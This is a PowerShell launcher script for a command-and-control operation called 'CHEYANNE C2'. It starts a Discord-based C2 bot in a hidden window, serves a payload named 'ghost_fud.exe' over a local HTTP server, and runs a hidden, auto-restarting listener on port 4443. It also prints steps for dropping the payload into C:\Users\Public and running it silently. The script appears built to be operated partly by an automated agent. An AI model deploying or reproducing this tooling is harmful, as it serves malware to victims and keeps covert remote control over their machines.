# vader_menu.ps1 - CHEYANNE C2 full stack launcher
# Sequences: kill stale ports -> discord_c2 -> HTTP server -> listener supervisor
# Non-interactive (PALPATINE): powershell -File vader_menu.ps1 -choice 1
param([string]$choice = "")

$cheyanne    = $PSScriptRoot
$agent_dir   = "$cheyanne\agent"
$dist_dir    = "$agent_dir\dist"
$listener_py = "$agent_dir\listener.py"
$c2_py       = "$agent_dir\discord_c2.py"

function Write-Step {
    param($n, $msg, $color = "Cyan")
    Write-Host "[$n] $msg" -ForegroundColor $color
}

function Kill-Port {
    param($port)
    $out = netstat -ano | Select-String ":$port "
    $ids = $out | ForEach-Object {
        ($_ -split '\s+') | Where-Object { $_ -match '^\d+$' } | Select-Object -Last 1
    } | Where-Object { $_ -and $_ -ne '0' } | Sort-Object -Unique
    foreach ($p in $ids) {
        try {
            Stop-Process -Id ([int]$p) -Force -ErrorAction SilentlyContinue
            Write-Host "  killed PID $p on :$port" -ForegroundColor Yellow
        } catch {}
    }
}

function Test-PortInUse {
    param($port)
    return [bool](netstat -ano | Select-String ":$port ")
}

function Test-ProcessRunning {
    param($pattern)
    $procs = Get-CimInstance Win32_Process -Filter "Name='python.exe'" -ErrorAction SilentlyContinue
    return ($procs | Where-Object { $_.CommandLine -like "*$pattern*" }).Count -gt 0
}

function Get-FreePort {
    param($candidates)
    foreach ($port in $candidates) {
        if (-not (Test-PortInUse $port)) { return $port }
    }
    return $candidates[-1]
}

function Get-LocalIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -eq 'Dhcp'
        } | Select-Object -First 1).IPAddress
        if ($ip) { return $ip }
    } catch {}
    return "192.168.1.92"
}

# -----------------------------------------------------------------------
function Start-Stack {
    Write-Host ""

    Write-Step 1 "Clearing port 4443..." "Yellow"
    Kill-Port 4443
    Start-Sleep 1

    Write-Step 2 "Checking discord_c2.py..." "Yellow"
    if (Test-ProcessRunning "discord_c2.py") {
        Write-Step 2 "discord_c2.py already running" "Green"
    } else {
        Start-Process python -ArgumentList $c2_py -WorkingDirectory $agent_dir -WindowStyle Hidden
        Start-Sleep 2
        if (Test-ProcessRunning "discord_c2.py") {
            Write-Step 2 "discord_c2.py started OK" "Green"
        } else {
            Write-Step 2 "discord_c2.py FAILED - check manually" "Red"
        }
    }

    Write-Step 3 "Finding free HTTP port..." "Yellow"
    $http_port = Get-FreePort @(8080, 8888, 9000, 9090)
    Start-Process python -ArgumentList "-m http.server $http_port" -WorkingDirectory $dist_dir -WindowStyle Hidden
    Start-Sleep 1
    if (Test-PortInUse $http_port) {
        Write-Step 3 "HTTP server on :$http_port" "Green"
    } else {
        Write-Step 3 "HTTP server starting on :$http_port (give it 2s)" "Yellow"
    }

    Write-Step 4 "Starting listener supervisor on :4443..." "Yellow"
    $sup = "while(`$true) { python '$listener_py'; Start-Sleep 2 }"
    Start-Process powershell -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -Command $sup" -WindowStyle Hidden
    Start-Sleep 2

    $ip = Get-LocalIP
    $http_url = "http://${ip}:${http_port}/ghost_fud.exe"

    Write-Host ""
    Write-Host "========== STACK ONLINE ==========" -ForegroundColor Green
    Write-Host "  Listener : 0.0.0.0:4443 [supervised - auto-restart]" -ForegroundColor White
    Write-Host "  HTTP     : $http_url" -ForegroundColor White
    Write-Host "  C2 bot   : discord_c2.py" -ForegroundColor White
    Write-Host "==================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "RAED:" -ForegroundColor Cyan
    Write-Host "  1. Browser: $http_url" -ForegroundColor White
    Write-Host "  2. Save as: C:\Users\Public\ghost_loader.exe" -ForegroundColor White
    Write-Host '  3. CMD: start /B "" "C:\Users\Public\ghost_loader.exe"' -ForegroundColor White
    Write-Host ""

    Set-Content "$cheyanne\stack_status.txt" -Encoding utf8 -Value @(
        "STACK_STATUS=ONLINE",
        "HTTP_PORT=$http_port",
        "HTTP_URL=$http_url",
        "LISTENER_PORT=4443",
        "LISTENER_SUPERVISED=true",
        "C2_BOT=discord_c2.py",
        "RAED_URL=$http_url",
        "RAED_SAVE=C:\Users\Public\ghost_loader.exe",
        "RAED_CMD=start /B ghost_loader.exe"
    )
    Write-Host "  [status written to stack_status.txt]" -ForegroundColor DarkGray
}

function Check-Stack {
    Write-Host ""
    Write-Host "-- STACK STATUS --" -ForegroundColor Cyan

    $items = @(
        @{ label = "discord_c2.py  "; ok = Test-ProcessRunning "discord_c2.py" },
        @{ label = "listener :4443 "; ok = Test-PortInUse 4443 },
        @{ label = "VADER gateway  "; ok = Test-ProcessRunning "vader.gateway_discord" },
        @{ label = "PALPATINE      "; ok = Test-ProcessRunning "hermes" }
    )
    foreach ($item in $items) {
        $txt = if ($item.ok) { "RUNNING" } else { "DOWN" }
        $col = if ($item.ok) { "Green" } else { "Red" }
        Write-Host ("  {0}: {1}" -f $item.label, $txt) -ForegroundColor $col
    }

    $http_running = ""
    foreach ($p in @(8080, 8888, 9000, 9090)) {
        if (Test-PortInUse $p) { $http_running = "RUNNING (:$p)"; break }
    }
    if (-not $http_running) { $http_running = "DOWN" }
    $col = if ($http_running -like "*RUNNING*") { "Green" } else { "Red" }
    Write-Host ("  HTTP server    : {0}" -f $http_running) -ForegroundColor $col

    if (Test-Path "$cheyanne\stack_status.txt") {
        Write-Host ""
        Write-Host "  Last boot:" -ForegroundColor DarkGray
        Get-Content "$cheyanne\stack_status.txt" | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
    }
    Write-Host ""
}

function Kill-Stack {
    Write-Host ""
    Write-Step "K" "Killing all C2 processes..." "Yellow"
    foreach ($port in @(4443, 8080, 8888, 9000, 9090)) { Kill-Port $port }
    foreach ($t in @("discord_c2.py", "listener.py", "watch_stream.py")) {
        $procs = Get-CimInstance Win32_Process -Filter "Name='python.exe'" -ErrorAction SilentlyContinue |
                 Where-Object { $_.CommandLine -like "*$t*" }
        foreach ($p in $procs) {
            try { Stop-Process -Id $p.ProcessId -Force; Write-Host "  killed $($p.ProcessId) ($t)" -ForegroundColor Yellow } catch {}
        }
    }
    Get-Process powershell -ErrorAction SilentlyContinue | ForEach-Object {
        $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
        if ($cmd -like "*listener.py*") {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            Write-Host "  killed supervisor PID $($_.Id)" -ForegroundColor Yellow
        }
    }
    if (Test-Path "$cheyanne\stack_status.txt") { Remove-Item "$cheyanne\stack_status.txt" }
    Write-Step "K" "Stack killed." "Red"
    Write-Host ""
}

function Start-ListenerOnly {
    Write-Step "L" "Clearing port 4443..." "Yellow"
    Kill-Port 4443
    Start-Sleep 1
    $sup = "while(`$true) { python '$listener_py'; Start-Sleep 2 }"
    Start-Process powershell -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -Command $sup" -WindowStyle Hidden
    Start-Sleep 2
    if (Test-PortInUse 4443) {
        Write-Step "L" "Listener supervisor running on :4443" "Green"
    } else {
        Write-Step "L" "Listener starting - check: netstat -ano | findstr :4443" "Yellow"
    }
    Write-Host ""
}

# -----------------------------------------------------------------------
if (-not $choice) {
    Write-Host ""
    Write-Host "+===========================================+" -ForegroundColor Red
    Write-Host "|   CHEYANNE C2  -  STACK LAUNCHER         |" -ForegroundColor Red
    Write-Host "|  1  Full boot (all components)           |" -ForegroundColor White
    Write-Host "|  2  Check stack status                   |" -ForegroundColor White
    Write-Host "|  3  Kill stack (all python C2 procs)     |" -ForegroundColor White
    Write-Host "|  4  Restart stack (kill + boot)          |" -ForegroundColor White
    Write-Host "|  5  Listener only (with supervisor)      |" -ForegroundColor White
    Write-Host "|  Q  Quit                                 |" -ForegroundColor White
    Write-Host "+===========================================+" -ForegroundColor Red
    Write-Host ""
    $choice = Read-Host "Select"
}

switch ($choice.Trim().ToUpper()) {
    "1" { Start-Stack }
    "2" { Check-Stack }
    "3" { Kill-Stack }
    "4" { Kill-Stack; Start-Sleep 1; Start-Stack }
    "5" { Start-ListenerOnly }
    "Q" { Write-Host "Abort." -ForegroundColor DarkGray }
    default { Write-Host "Unknown option '$choice'. Use 1-5 or Q." -ForegroundColor Red }
}
